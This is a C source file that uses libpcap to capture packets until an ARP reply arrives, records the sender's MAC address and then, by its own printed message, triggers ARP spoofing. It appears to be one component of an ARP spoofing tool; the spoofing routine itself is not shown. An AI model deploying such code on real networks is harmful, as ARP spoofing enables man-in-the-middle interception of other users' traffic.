#include "pcaph.h"
#include "arph.h"

void *get_packet(){
    pcap_t *handle;
    bpf_u_int32 netaddr=0, mask=0;
    char *dev=NULL;
    char errbuf[PCAP_ERRBUF_SIZE];
    char filter_exp[]="";
    int res=0;
    struct bpf_program fp;
    struct pcap_pkthdr *header;
    const struct sniff_ethernet *ethernet;
    const u_char *pkt_data;
    arphdr_t *arpHeader=NULL;
    int i;

    // define dev
    dev = pcap_lookupdev(errbuf);
    if(dev == NULL){
        fprintf(stderr, "[-] Device: %s\n", dev);
        return (void *)1;
    }

    // look up info from the capture dev
    if(pcap_lookupnet(dev, &netaddr, &mask, errbuf) == -1){

        mask=0;
    }

    printf("[+] Dev\t\t: %s\n", dev);
    
    // open dev
    handle = pcap_open_live(dev, BUFSIZ, 1, TIMEOUT, errbuf);
    if(handle == NULL){
        fprintf(stderr, "[-] Open dev: %s: %s\n", dev, errbuf);
        exit(EXIT_FAILURE);
    }

    // compile filter_exp into BPF filter program
    if(pcap_compile(handle, &fp, filter_exp, 0, netaddr) == -1){
        fprintf(stderr, "[-] Parsing filter: %s: %s\n", filter_exp, pcap_geterr(handle));
        return (void *)1; 
    }

    while((res=pcap_next_ex(handle, &header, (const u_char **)&pkt_data))>=0){
        if(res==0){
            printf("[*] Timeout\n");
            continue;
        }
        arpHeader = (struct arphdr *)(pkt_data+SIZE_ETHERNET); 
        
        if(ntohs(arpHeader->oper) == ARP_REPLY){
            printf("\n[+] Get sender mac: ");
            printMac(arpHeader->sha);
            break; 
        }
    }

    if(res == -1){
        fprintf(stderr, "[-] Reading packet: %s\n", pcap_geterr(handle));
        return (void *)1;
    }else{
        arpArgv.arpop=ARP_REPLY;
        for(i=0; i<MAC_LEN; i++)
            arpArgv.senderMac[i]=(unsigned int)arpHeader->sha[i];
        printf("[+] Trigger for ARP spoofing\n");
        arpRequest();
    }
    return (void *)0;
}
